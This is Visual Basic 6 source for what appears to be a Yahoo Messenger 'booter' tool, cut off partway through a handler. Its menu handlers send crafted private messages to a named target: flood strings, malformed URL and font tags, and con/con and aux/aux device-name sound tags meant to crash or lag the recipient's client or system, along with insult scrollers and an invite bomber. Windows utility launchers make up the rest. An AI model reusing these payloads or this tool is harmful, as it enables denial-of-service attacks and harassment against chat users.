VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   435
   ClientLeft      =   165
   ClientTop       =   855
   ClientWidth     =   2520
   LinkTopic       =   "Form1"
   ScaleHeight     =   435
   ScaleWidth      =   2520
   StartUpPosition =   3  'Windows Default
   Begin VB.Menu file 
      Caption         =   "File"
      Begin VB.Menu afadfdsf 
         Caption         =   "Boots"
         Begin VB.Menu main1 
            Caption         =   "Boots"
            Begin VB.Menu fgfg4 
               Caption         =   "Blue Screen"
            End
            Begin VB.Menu dcas 
               Caption         =   "Y!Error"
            End
            Begin VB.Menu adfadsfadafd 
               Caption         =   "Unseen Death"
            End
            Begin VB.Menu sadffff 
               Caption         =   "Sh¦ftY's - K!LL"
            End
            Begin VB.Menu adsfasdfdfasf 
               Caption         =   "H4v0c"
            End
            Begin VB.Menu ffffdafaf 
               Caption         =   "T3rr0r"
            End
            Begin VB.Menu dafsdfadsfdsa 
               Caption         =   "Fr33z3"
            End
            Begin VB.Menu ddddddffff 
               Caption         =   "M3k4"
            End
            Begin VB.Menu ffff 
               Caption         =   "V1ll4n"
            End
            Begin VB.Menu chatclear 
               Caption         =   "Chat Clear"
            End
            Begin VB.Menu invitebomber 
               Caption         =   "Invite Bomber"
            End
         End
         Begin VB.Menu fdsgfdg 
            Caption         =   "-"
         End
         Begin VB.Menu adfdsfasdf 
            Caption         =   "Laggs"
            Begin VB.Menu afsdsacfsdf 
               Caption         =   "Sad Lagg"
            End
            Begin VB.Menu sDASDASD 
               Caption         =   "Mad Lagg"
            End
            Begin VB.Menu bn 
               Caption         =   "Happy  Lagg"
            End
            Begin VB.Menu adfsadfsdfasfa 
               Caption         =   "Sick Lagg"
            End
            Begin VB.Menu nnnnn 
               Caption         =   "Sound Lagg"
            End
            Begin VB.Menu asfdadsfsadf 
               Caption         =   "Evil Lagg"
            End
            Begin VB.Menu ghggf 
               Caption         =   "Ultimate Lagg"
            End
         End
         Begin VB.Menu fgfg 
            Caption         =   "-"
         End
         Begin VB.Menu fffffffdaf 
            Caption         =   "Scrollers"
            Begin VB.Menu adfdsafasdfas 
               Caption         =   "Sh¦ftY"
            End
            Begin VB.Menu afdsfdafdfs 
               Caption         =   "L4m3r"
            End
            Begin VB.Menu fasdfdsfac 
               Caption         =   "You Suck"
            End
            Begin VB.Menu afsasddasa 
               Caption         =   "Uns33n"
            End
         End
         Begin VB.Menu hgjfghjfg 
            Caption         =   "-"
         End
         Begin VB.Menu asfdsfdsdfasdf 
            Caption         =   "Ultimate Offensive Bot"
            Begin VB.Menu asdfdsaf 
               Caption         =   "Offend Them"
            End
         End
      End
      Begin VB.Menu break 
         Caption         =   "-"
      End
   End
   Begin VB.Menu mnuWin 
      Caption         =   "Windows"
      Begin VB.Menu properties 
         Caption         =   "Properties"
      End
      Begin VB.Menu opencd 
         Caption         =   "Open CD Rom"
      End
      Begin VB.Menu closecd 
         Caption         =   "Close CD Rom"
      End
      Begin VB.Menu curentuser 
         Caption         =   "Log Off"
      End
      Begin VB.Menu shutdown 
         Caption         =   "Shutdown"
      End
      Begin VB.Menu cpannel 
         Caption         =   "Control Panel"
      End
      Begin VB.Menu regedit 
         Caption         =   "Regedit"
      End
      Begin VB.Menu exployer 
         Caption         =   "Explorer"
      End
      Begin VB.Menu scan 
         Caption         =   "Scandisk"
      End
      Begin VB.Menu defrag 
         Caption         =   "Defrag"
      End
      Begin VB.Menu wizard 
         Caption         =   "Maintenance Wizard"
      End
      Begin VB.Menu mnuDTW 
         Caption         =   "Desktop Wallpaper"
      End
      Begin VB.Menu ftp 
         Caption         =   "FTP"
      End
      Begin VB.Menu config 
         Caption         =   "IP configure"
      End
      Begin VB.Menu break2 
         Caption         =   "-"
      End
      Begin VB.Menu games 
         Caption         =   "Games..."
         Begin VB.Menu winmine 
            Caption         =   "Minesweeper"
         End
         Begin VB.Menu sol 
            Caption         =   "Solitaire"
         End
         Begin VB.Menu freecell 
            Caption         =   "Freecell"
         End
      End
      Begin VB.Menu misc 
         Caption         =   "Misc..."
         Begin VB.Menu firewall 
            Caption         =   "Firewall"
         End
         Begin VB.Menu mailer 
            Caption         =   "Anonymous Mailer"
         End
         Begin VB.Menu capture 
            Caption         =   "Screen Capture"
         End
         Begin VB.Menu alarm 
            Caption         =   "Alarm Clock"
         End
         Begin VB.Menu address 
            Caption         =   "Address Book"
         End
      End
      Begin VB.Menu break4 
         Caption         =   "-"
      End
      Begin VB.Menu websites 
         Caption         =   "Websites..."
         Begin VB.Menu Shifty 
            Caption         =   "Sh¦ftY's Site"
         End
         Begin VB.Menu yahoo 
            Caption         =   "Yahoo!"
         End
         Begin VB.Menu hotmail 
            Caption         =   "Hotmail"
         End
         Begin VB.Menu aol 
            Caption         =   "AOL"
         End
         Begin VB.Menu free 
            Caption         =   "VB5 For Free!!!!!!!!"
         End
      End
      Begin VB.Menu yahoo2 
         Caption         =   "Yahoo!"
         Begin VB.Menu profiler 
            Caption         =   "Profiler"
         End
         Begin VB.Menu cool 
            Caption         =   "Friend Remover"
         End
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function WaitForSingleObject Lib "kernel32" _
   (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long

Private Declare Function CloseHandle Lib "kernel32" _
   (ByVal hObject As Long) As Long
   
Private Declare Function OpenProcess Lib "kernel32" _
   (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, _
    ByVal dwProcessId As Long) As Long


Private Const INFINITE = -1&
Private Const SYNCHRONIZE = &H100000

' <VB WATCH>
Const VBWMODULE = "Form1"
Private vbwInstanceID As Long
' </VB WATCH>

Private Sub address_Click()
'An Alternative Is To Open Outlook Express By Replacing <Path> With The Path To Outlook :P
'Shell ("<Path>")
End Sub

Private Sub adfadsfadafd_Click()
Call ANTI
Call SendPMBoot(unseen.Text1.Text, "", True, True)
End Sub

Private Sub adfdsafasdfas_Click()
Call SendPMScroll(unseen.Text1.Text, "<font size=100><b>n3t-wizards", 25, True)
End Sub


Private Sub adfsadfsdfasfa_Click()
ANTI
Call SendPMLagg(unseen.Text1.Text, "F", True, 25)
End Sub

Private Sub adsfasdfdfasf_Click()
Call ANTI
Call SendPMBoot(unseen.Text1.Text, "", True, True)
End Sub

Private Sub afdsfdafdfs_Click()
Call SendPMScroll(unseen.Text1.Text, "<b><red>LAMER!!!", 25, True)
End Sub

Private Sub afsasddasa_Click()
Call SendPMScroll(unseen.Text1.Text, "<b><fade #993333,#0066ff><b>Unseen", 25, True)
End Sub

Private Sub afsdsacfsdf_Click()
ANTI
Call SendPMLagg(unseen.Text1.Text, ":(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((:(:((", True, 25)
End Sub

Private Sub alarm_Click()

'alarm1.Show
End Sub

Private Sub aol_Click()
retVal = Shell("explorer http://www.aol.com", vbHide)

End Sub

Private Sub asdfdsaf_Click()
Bot_Offender (unseen.Text1.Text)
End Sub

Private Sub asfdadsfsadf_Click()
ANTI
Call SendPMLagg(unseen.Text1.Text, "8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)8-x>:)", True, 25)
End Sub

Private Sub bn_Click()
ANTI
Call SendPMLagg(unseen.Text1.Text, ":):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:))", True, 25)
End Sub

Private Sub capture_Click()
'frmcapture.Show
End Sub

Private Sub chatclear_Click()
Call clearchat
End Sub

Private Sub closecd_Click()
' <VB WATCH>
1          On Error GoTo vbwErrHandler
2          Const VBWPROCNAME = "Form1.closecd_Click"
3          If vbwTraceProc Then
4              Dim vbwParameterString As String
5              If vbwTraceParameters Then
6                  vbwParameterString = "()"
7              End If
8              vbwTraceIn VBWPROCNAME, vbwParameterString
9          End If
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "10     retvalue = mciSendString(" & Chr(34) & "set CDAudio door closed" & Chr(34) & ", _"
' </VB WATCH>
10     retvalue = mciSendString("set CDAudio door closed", _
       returnstring, 127, 0)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
11         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
12         Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "closecd_Click"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

Private Sub code_Click()
retVal = Shell("explorer http://www.codearchive.com", vbHide)

End Sub

Private Sub config_Click()
MsgBox "Haven't Quite Worked It Out For XP Yet But Below Is The Config For Win98", vbInformation, "Next Gen"
' Dim iTask As Long, Ret As Long, pHandle As Long
'    iTask = Shell("winipcfg.exe", vbNormalFocus)
'    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
'    Ret = WaitForSingleObject(pHandle, INFINITE)
'    Ret = CloseHandle(pHandle)

End Sub

Private Sub cool_Click()
MsgBox "You Gotta Remake The Form For This Aswell As I Started Using MSN Alot More I Took Them Out", vbInformation, "Next Gen"
'frmcool.Show
End Sub

Private Sub cpannel_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("control.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub

Private Sub curentuser_Click()
' <VB WATCH>
13         On Error GoTo vbwErrHandler
14         Const VBWPROCNAME = "Form1.curentuser_Click"
15         If vbwTraceProc Then
16             Dim vbwParameterString As String
17             If vbwTraceParameters Then
18                 vbwParameterString = "()"
19             End If
20             vbwTraceIn VBWPROCNAME, vbwParameterString
21         End If
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "22     Call Log_Off_Current_User"
' </VB WATCH>
22     Call Log_Off_Current_User

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
23         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
24         Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "curentuser_Click"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

Private Sub DTPicker1_CallbackKeyDown(ByVal KeyCode As Integer, ByVal Shift As Integer, ByVal CallbackField As String, CallbackDate As Date)

End Sub

Private Sub dafsdfadsfdsa_Click()
Call ANTI
Call SendPMBoot(unseen.Text1.Text, "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", True, True)
End Sub

Private Sub dcas_Click()
Call ANTI
Call SendPMBoot(unseen.Text1.Text, "<url=>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)>:)", True, True)
End Sub

Private Sub ddddddffff_Click()
Call ANTI
Call SendPMBoot(unseen.Text1.Text, "<b>MEKA<snd=con/con><url=8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x8-x>", True, True)
End Sub

Private Sub dfaf_Click()

End Sub

Private Sub defrag_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("defrag.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub

Private Sub euyulio_Click()

retVal = Shell("Start.exe http://www.euyulio.org", vbHide)


End Sub

Private Sub exployer_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("explorer.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub

Private Sub fasdfdsfac_Click()
Call SendPMScroll(unseen.Text1.Text, "<snd=pow>YOU SUCK<snd=pow>", 25, True)
End Sub

Private Sub ffff_Click()
Call ANTI

Call Boot3
End Sub


Private Sub ffffdafaf_Click()
Call ANTI
Call SendPMBoot(unseen.Text1.Text, "<snd=pow><snd=yahoo><font face=:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((:):(:)):((", True, True)
End Sub


Private Sub fgfg4_Click()
Call ANTI
Call SendPMBoot(unseen.Text1.Text, "<snd=con/con><snd=pow><snd=aux/aux><snd=con/con><snd=pow><snd=aux/aux><snd=con/con><snd=pow><snd=aux/aux><snd=con/con><snd=pow><snd=aux/aux><snd=con/con><snd=pow><snd=aux/aux><snd=con/con><snd=pow><snd=aux/aux><snd=con/con><snd=pow><snd=aux/aux>", True, True)
End Sub

Private Sub firewall_Click()
'What you gotta do is replace <Path> with the path to your firewall
'Shell ("<Path>")
End Sub

Private Sub free_Click()
retVal = Shell("Start.exe ftp://ftp.engr.orst.edu/pub/vbcc/vb5ccein.exe", vbHide)

End Sub

Private Sub freecell_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("freecell.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub

Private Sub freevb_Click()
retVal = Shell("explorer http://www.freevbcode.com", vbHide)

End Sub

Private Sub ftp_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("ftp.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub

Private Sub ghggf_Click()
ANTI
Call SendPMLagg(unseen.Text1.Text, "**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)**==<snd=pow>(~~)", True, 25)
End Sub

Private Sub hyper_Click()

End Sub

Private Sub hotmail_Click()
retVal = Shell("explorer http://www.hotmail.com", vbHide)

End Sub

Private Sub invitebomber_Click()
' <VB WATCH>
25         On Error GoTo vbwErrHandler
26         Const VBWPROCNAME = "Form1.invitebomber_Click"
27         If vbwTraceProc Then
28             Dim vbwParameterString As String
29             If vbwTraceParameters Then
30                 vbwParameterString = "()"
31             End If
32             vbwTraceIn VBWPROCNAME, vbwParameterString
33         End If
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "34     invite_bomber.Show"
' </VB WATCH>
34     invite_bomber.Show

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
35         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
36         Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "invitebomber_Click"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

Private Sub life_Click()
frmmoving.Show
End Sub

Private Sub lord_Click()
retVal = Shell("explorer http://lordofdestruction2.tripod.com/lordofdestruction/id3.html", vbHide)

End Sub

Private Sub mailer_Click()
'frmmailer.Show
End Sub

Private Sub mankind_Click()

retVal = Shell("Start.exe http://www.geocities.com/mankind_______/disclaimer.html", vbHide)

End Sub

Private Sub moo_Click()
retVal = Shell("Start.exe http://www.mooinc.cjb.net/", vbHide)

End Sub

Private Sub mnuDTW_Click()
frmDskTop.Show

End Sub

Private Sub nnnnn_Click()
ANTI
Call SendPMLagg(unseen.Text1.Text, "<snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click><snd=pow><snd=yahoo><snd=doorbell><snd=cowbell><snd=door><snd=yahoomail><snd=click>", True, 25)
End Sub
Private Sub opencd_Click()
' <VB WATCH>
37         On Error GoTo vbwErrHandler
38         Const VBWPROCNAME = "Form1.opencd_Click"
39         If vbwTraceProc Then
40             Dim vbwParameterString As String
41             If vbwTraceParameters Then
42                 vbwParameterString = "()"
43             End If
44             vbwTraceIn VBWPROCNAME, vbwParameterString
45         End If
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "46     retvalue = mciSendString(" & Chr(34) & "set CDAudio door open" & Chr(34) & ", _"
' </VB WATCH>
46     retvalue = mciSendString("set CDAudio door open", _
       returnstring, 127, 0)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
47         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
48         Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "opencd_Click"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

Private Sub planet_Click()
retVal = Shell("Start.exe http://www.planet-source-code.com", vbHide)

End Sub

Private Sub profiler_Click()
MsgBox "You Gotta Remake The Form For This As I Took It Out!", vbInformation, "Next Gen"
'frmprofiler.Show
End Sub

Private Sub properties_Click()
' <VB WATCH>
49         On Error GoTo vbwErrHandler
50         Const VBWPROCNAME = "Form1.properties_Click"
51         If vbwTraceProc Then
52             Dim vbwParameterString As String
53             If vbwTraceParameters Then
54                 vbwParameterString = "()"
55             End If
56             vbwTraceIn VBWPROCNAME, vbwParameterString
57         End If
' </VB WATCH>
' <VB WATCH>
